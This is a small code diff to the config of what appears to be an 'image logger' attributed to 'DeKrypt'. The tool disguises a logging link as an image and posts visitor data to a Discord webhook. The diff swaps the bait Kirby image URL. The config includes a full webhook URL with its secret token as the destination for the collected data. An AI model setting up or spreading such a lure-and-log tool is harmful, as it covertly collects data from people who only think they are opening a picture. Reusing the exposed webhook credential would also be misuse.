@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335776381132472381/ADekNwvQsuBbd17MbFAZJucNlihQap_W-m3h8PJ_WbKNqDzkUktoq2UQqLaUCbd5JbEF",
-    "image": "https://static.wikia.nocookie.net/kirby/images/8/86/KRtDLD_Kirby.png/revision/latest?cb=20230214153003", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/en/4/4e/Kirby_Nintendo.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
